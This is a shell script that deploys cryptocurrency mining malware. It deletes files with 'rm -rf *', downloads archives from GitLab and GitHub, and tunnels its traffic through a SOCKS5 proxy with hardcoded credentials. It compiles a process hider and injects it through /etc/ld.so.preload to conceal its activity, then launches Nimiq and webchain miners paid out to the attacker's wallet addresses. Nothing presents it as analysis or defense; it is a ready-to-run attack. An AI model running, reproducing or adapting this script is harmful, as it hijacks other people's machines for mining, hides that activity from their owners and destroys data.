rm -rf *
mkdir d
cd d

#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://gitlab.com/meldiyunrianto/nimik/-/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz
rm -rf graphich.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 54.66.32.167:8388
socks5_username = clarksye
socks5_password = user123
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp rm -rf gas && wget -q 'https://gitlab.com/meldiyunrianto/nimik/-/raw/main/korek.zip' && unzip korek.zip
chmod +x gas
rm -rf Makefile
rm -rf processhider.c
rm -rf README.md
rm -rf .gitignore
rm -rf korek.zip

./graftcp/graftcp wget https://github.com/AhmadTugiman/gembel/raw/main/tukimin.zip
unzip tukimin.zip
rm -rf tukimin.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./gas -d=0 -a "NQ37B0LH99BFA0G0VRJ5DQLU7PJS3PT1S280" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)) -t 4  -i Disable & ./graftcp/graftcp wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./graftcp/graftcp ./webchain-miner -o 212.32.255.5:3333 -u 0x06D3E7f1169A0064A03d5CA2ce50B6A24bF2D39b -p 250 -t 4 --worker=$(echo $(shuf -i 1-20000 -n 1)) --donate-level=1%
